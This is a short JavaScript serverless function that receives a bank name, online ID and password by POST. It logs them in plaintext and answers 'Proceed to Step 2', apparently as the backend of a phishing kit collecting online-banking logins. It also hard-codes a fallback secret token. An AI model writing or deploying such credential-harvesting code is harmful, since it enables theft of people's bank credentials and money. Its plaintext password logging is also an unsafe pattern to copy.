export async function handler(event, context) {
if (event.httpMethod !== 'POST') {
return {
statusCode: 405,
body: JSON.stringify({ status: 'error', message: 'Method not allowed.' })
};
}

let data;
try {
data = JSON.parse(event.body);
} catch (e) {
return {
statusCode: 400,
body: JSON.stringify({ status: 'error', message: 'Invalid JSON body.' })
};
}

const { token, session_id, bankName, onlineId, password } = data;
const SECRET_TOKEN = process.env.SECRET_TOKEN || "T20199328";

// Basic validation
if (!data || token !== SECRET_TOKEN || !session_id) {
return {
statusCode: 400,
body: JSON.stringify({ status: 'error', message: 'Invalid request or token.' })
};
}

console.log(`Step 1 Log - Session: ${session_id}`);
console.log(`Bank: ${bankName}, ID: ${onlineId}, Password: ${password}`);

return {
statusCode: 200,
body: JSON.stringify({ status: 'success', message: 'Login data accepted. Proceed to Step 2.' })
};
}
